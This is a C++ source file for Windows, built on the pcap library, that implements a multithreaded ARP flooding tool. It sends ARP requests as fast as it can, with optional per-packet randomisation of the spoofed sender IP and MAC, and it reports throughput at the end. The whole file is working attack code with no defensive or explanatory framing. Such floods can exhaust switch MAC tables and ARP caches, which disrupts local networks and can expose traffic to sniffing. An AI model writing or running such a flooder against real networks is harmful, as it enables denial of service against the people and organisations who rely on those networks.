// g++ -g arp.cpp -o arp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};

struct arp_header {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t opcode;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
};
#pragma pack(pop)

bool is_ipv6(const char* ip) {
    struct sockaddr_in6 sa6;
    return inet_pton(AF_INET6, ip, &sa6.sin6_addr) == 1;
}

bool get_local_mac_ipv4(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name_ipv4(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n", &tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5],&consumed) != 6)
        return false;
    if (str[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(tmp[i]);
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) {
        if (i) std::printf(":");
        std::printf("%02X", mac[i]);
    }
    std::printf("\n");
}

class PrebuiltPacket {
public:
    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(arp_header);
    alignas(64) uint8_t buffer[PACKET_SIZE];
    size_t size;
    size_t src_mac_offset;
    size_t src_ip_offset;
    size_t dst_ip_offset;
    uint32_t src_ip;
    uint32_t dst_ip;
    uint8_t dst_mac[6];

    PrebuiltPacket(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac)
        : src_ip(src_ip), dst_ip(dst_ip) {
        memcpy(this->dst_mac, dst_mac, 6);
        size = PACKET_SIZE;
        memset(buffer, 0, size);

        ether_header* eth = (ether_header*)buffer;
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0806);

        arp_header* arp = (arp_header*)(buffer + sizeof(ether_header));
        arp->htype = htons(1);
        arp->ptype = htons(0x0800);
        arp->hlen = 6;
        arp->plen = 4;
        arp->opcode = htons(1);
        memcpy(arp->sender_mac, src_mac, 6);
        memcpy(arp->sender_ip, &src_ip, 4);
        memcpy(arp->target_ip, &dst_ip, 4);

        src_mac_offset = offsetof(ether_header, ether_shost);
        src_ip_offset = sizeof(ether_header) + offsetof(arp_header, sender_ip);
        dst_ip_offset = sizeof(ether_header) + offsetof(arp_header, target_ip);
    }

    void set_src_mac(const uint8_t mac[6]) {
        memcpy(buffer + src_mac_offset, mac, 6);
        memcpy(buffer + sizeof(ether_header) + offsetof(arp_header, sender_mac), mac, 6);
    }

    void set_src_ip(uint32_t ip) {
        src_ip = ip;
        memcpy(buffer + src_ip_offset, &ip, 4);
    }
};

class FloodEngine {
private:
    pcap_t* pcap_handle;
    PrebuiltPacket packet_template;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    bool random_ip;
    bool random_mac;

public:
    FloodEngine(pcap_t* handle, uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
                int thread_index, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag)
        : packet_template(src_ip, src_mac, dst_ip, dst_mac),
          pcap_handle(handle), total_packets_sent(total_counter), stop_flag(stop),
          random_ip(random_ip_flag), random_mac(random_mac_flag) {}

    void start(int core_id) {
        HANDLE hThread = GetCurrentThread();
        SetThreadAffinityMask(hThread, 1ULL << core_id);
        SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);

        uint32_t seed = time(nullptr) + core_id * 1000;
        auto lcg = [](uint32_t& s) -> uint32_t {
            s = s * 1103515245 + 12345;
            return (s >> 16) & 0x7FFF;
        };

        while (!stop_flag.load(std::memory_order_relaxed)) {
            if (random_ip) {
                uint32_t random_ip_val = (lcg(seed) & 0xFF) << 24 |
                                         (lcg(seed) & 0xFF) << 16 |
                                         (lcg(seed) & 0xFF) << 8 |
                                         (lcg(seed) & 0xFF);
                packet_template.set_src_ip(random_ip_val);
            }
            if (random_mac) {
                uint8_t mac[6];
                mac[0] = (lcg(seed) & 0xFE);
                for (int i = 1; i < 6; ++i) mac[i] = lcg(seed) & 0xFF;
                packet_template.set_src_mac(mac);
            }
            if (pcap_sendpacket(pcap_handle, packet_template.buffer, (int)packet_template.size) == 0) {
                total_packets_sent.fetch_add(1, std::memory_order_relaxed);
            } else {
                static thread_local uint32_t error_counter = 0;
                if ((++error_counter % 1000) == 1)
                    std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap_handle) << std::endl;
            }
        }
    }
};

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cerr << "Usage: " << argv[0]
                  << " <src_ip> <dst_ip> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n"
                  << "Note: ARP works only for IPv4. IPv6 is not supported.\n";
        return 1;
    }

    if (is_ipv6(argv[1]) || is_ipv6(argv[2])) {
        std::cerr << "Error: ARP does not support IPv6 addresses.\n";
        return 1;
    }

    uint32_t src_ip = inet_addr(argv[1]);
    uint32_t dst_ip = inet_addr(argv[2]);
    int num_threads = atoi(argv[3]);
    int duration = atoi(argv[4]);
    if (num_threads <= 0 || duration < 0) return 1;

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else if (parse_mac_strict(argv[i], dst_mac)) { /* ok */ }
        else std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
    }

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf) == -1) {
        std::cerr << "pcap_init failed: " << errbuf << std::endl;
        return 1;
    }

    std::string ifname;
    uint8_t src_mac[6] = {0};
    if (src_ip != 0) {
        ifname = get_interface_name_ipv4(src_ip);
        if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
        if (!random_mac && !get_local_mac_ipv4(src_ip, src_mac)) {
            std::cerr << "Cannot get local MAC\n"; return 1;
        }
    } else {
        pcap_if_t *alldevs;
        if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) return 1;
        if (alldevs) { ifname = alldevs->name; pcap_freealldevs(alldevs); }
        else { std::cerr << "No interfaces\n"; return 1; }
    }

    pcap_t* temp = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
    if (!temp || pcap_datalink(temp) != DLT_EN10MB) { std::cerr << "Link error\n"; return 1; }
    pcap_close(temp);

    std::vector<pcap_t*> handles;
    for (int i = 0; i < num_threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, PCAP_OPENFLAG_MAX_RESPONSIVENESS, 1000, nullptr, errbuf);
        if (!h) { for (auto hh : handles) pcap_close(hh); return 1; }
        handles.push_back(h);
    }

    std::cout << "Interface: " << ifname << "\nDestination MAC: "; print_mac(dst_mac);
    std::cout << "Random IP: " << (random_ip ? "yes" : "no") << "\nRandom MAC: " << (random_mac ? "yes" : "no") << "\n";

    std::atomic<uint64_t> total_packets(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;

    auto start = std::chrono::steady_clock::now();
    for (int i = 0; i < num_threads; i++) {
        auto engine = std::make_unique<FloodEngine>(handles[i], src_ip, src_mac, dst_ip, dst_mac, i, total_packets, stop, random_ip, random_mac);
        workers.emplace_back(&FloodEngine::start, engine.get(), i % cores);
        engine.release();
    }

    if (duration > 0) std::this_thread::sleep_for(std::chrono::seconds(duration));
    else { std::cout << "Press Enter to stop...\n"; std::cin.get(); }
    stop = true;
    for (auto& w : workers) if (w.joinable()) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count();
    uint64_t pkts = total_packets.load();
    if (elapsed == 0) elapsed = 1;
    double pps = pkts * 1000.0 / elapsed;
    double mbps = (pps * PrebuiltPacket::PACKET_SIZE * 8) / 1e6;
    std::cout << "\n--- Results ---\nTotal packets: " << pkts << "\nDuration: " << elapsed << " ms\nThroughput: " << pps << " pps\nBandwidth: " << mbps << " Mbps\n";
    for (auto h : handles) pcap_close(h);
    return 0;
}